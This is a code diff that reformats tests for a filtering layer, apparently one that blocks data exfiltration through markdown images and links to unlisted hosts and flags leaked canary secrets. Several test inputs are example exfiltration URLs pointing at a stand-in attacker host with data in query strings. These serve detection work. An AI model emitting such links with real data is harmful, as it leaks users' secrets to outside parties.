@@ -120,18 +120,14 @@ def test_canary_survives_stacked_obfuscation(
 
 
 def test_markdown_image_to_unlisted_host_is_blocked() -> None:
-    findings = _layer(
-    ).inspect_text("![x](https://attacker.example/p?d=hello)")
+    findings = _layer().inspect_text("![x](https://attacker.example/p?d=hello)")
 
     assert config.RULE_URL_EGRESS in _rules(findings)
-    assert all(
-        f.invariant for f in findings if f.rule == config.RULE_URL_EGRESS
-    )
+    assert all(f.invariant for f in findings if f.rule == config.RULE_URL_EGRESS)
 
 
 def test_plain_link_to_unlisted_host_is_blocked() -> None:
-    findings = _layer(
-    ).inspect_text("see https://attacker.example/collect?d=abc")
+    findings = _layer().inspect_text("see https://attacker.example/collect?d=abc")
 
     assert config.RULE_URL_EGRESS in _rules(findings)
 
@@ -176,8 +172,7 @@ def test_a_bare_double_slash_in_prose_is_not_a_url(text: str) -> None:
 
 
 def test_allowlisted_host_is_permitted() -> None:
-    findings = _layer(
-    ).inspect_text("see https://vantage.example/orders/8814")
+    findings = _layer().inspect_text("see https://vantage.example/orders/8814")
 
     assert findings == []
 
@@ -206,8 +201,7 @@ def test_a_suffix_allowlist_does_not_permit_a_lookalike(
 
 
 def test_allowlisted_host_still_checked_for_canary() -> None:
-    findings = _layer(
-    ).inspect_text(f"https://vantage.example/p?d={SECRET}")
+    findings = _layer().inspect_text(f"https://vantage.example/p?d={SECRET}")
 
     assert config.RULE_CANARY_LEAK in _rules(findings)
 
@@ -235,9 +229,7 @@ def test_a_layer_with_no_canaries_still_guards_urls() -> None:
     ],
 )
 def test_near_miss_text_is_not_a_leak(text: str) -> None:
-    assert config.RULE_CANARY_LEAK not in _rules(
-        _layer().inspect_text(text)
-    )
+    assert config.RULE_CANARY_LEAK not in _rules(_layer().inspect_text(text))
 
 
 def test_space_separated_canary_is_a_leak() -> None:
